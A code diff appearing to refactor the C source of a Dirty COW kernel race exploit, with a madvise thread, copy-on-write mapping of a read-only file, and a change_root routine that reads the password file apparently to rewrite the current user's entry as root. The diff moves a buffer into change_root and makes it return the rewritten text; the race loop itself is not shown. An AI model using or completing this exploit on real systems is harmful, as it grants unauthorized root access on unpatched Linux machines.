@@ -21,7 +21,7 @@ m00000000000000000
 #include <fcntl.h>
 #include <pthread.h>
 #include <string.h>
-#include <errno.h>
+#include <unistd.h>
 #include <pwd.h>
 #define ESC          "\033"
 #define LOOP 100000000
@@ -30,7 +30,6 @@ void *map;
 int f;
 struct stat st;
 char *name;
-char writen[102400];
 
 void *madviseThread(void *arg)
 {
@@ -75,7 +74,7 @@ You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?
   }
 }
  
-void
+char*
 change_root(char *name)
 {
   FILE            *fp;
@@ -84,6 +83,7 @@ change_root(char *name)
   char            tmpbuf[100] = {'\0'};
   struct passwd  *pwd;
   char           *tab1, *tab2, *tab3, *tab4;
+  char            writen[102400];
 
   fp=fopen(name, "r");
   pwd = getpwuid(getuid());
@@ -106,6 +106,8 @@ change_root(char *name)
       }
       memset(tmpbuf, '\0', 100);
   }
+
+  return strdup(writen);
 }
 
  
@@ -134,7 +136,7 @@ You have to use MAP_PRIVATE for copy-on-write mapping.
 /*
 You have to open with PROT_READ.
 */
-  change_root(name);
+  char *writen = change_root(name);
   map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
   printf("mmap %x\n\n",map);
 /*
